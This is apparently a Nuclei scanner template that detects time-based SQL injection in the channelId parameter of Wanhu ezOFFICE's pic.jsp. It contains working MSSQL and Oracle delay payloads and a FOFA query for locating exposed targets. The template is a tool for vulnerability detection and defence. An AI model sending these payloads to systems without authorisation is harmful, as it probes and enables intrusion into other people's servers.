id: wanhu-ezoffice-pic-sqli

info:
  name: 万户 ezoffice pic.jsp - sqli
  author: leadlife
  severity: high
  reference:
    - todo
  metadata: 
    verified: true
    max-request: 2
    fofa-query: app="万户网络-ezOFFICE"
  tags: wanhu,sqli,oa,hw,time,ezoffice

http:
  - raw:
      - |
        @timeout: 15s
        GET /defaultroot/platform/portal/portlet/pic/pic.jsp?num=1&channelId=1%27%20WAITFOR%20DELAY%20%270:0:6%27--%20FMZL HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        name: mssql
        dsl:
          - status_code == 200
          - duration >= 5 && duration < 9
          - contains(body,'ifocus_piclist')
        condition: and

  - raw:
      - |
        @timeout: 15s
        GET /defaultroot/platform/portal/portlet/pic/pic.jsp?num=1&channelId=1%27%20AND%208611=DBMS_PIPE.RECEIVE_MESSAGE(CHR(77)%7C%7CCHR(86)%7C%7CCHR(109)%7C%7CCHR(79),6)--%20OfwB HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        name: oracle
        dsl:
          - status_code == 200
          - duration >= 5 && duration < 9
          - contains(body,'ifocus_piclist')
        condition: and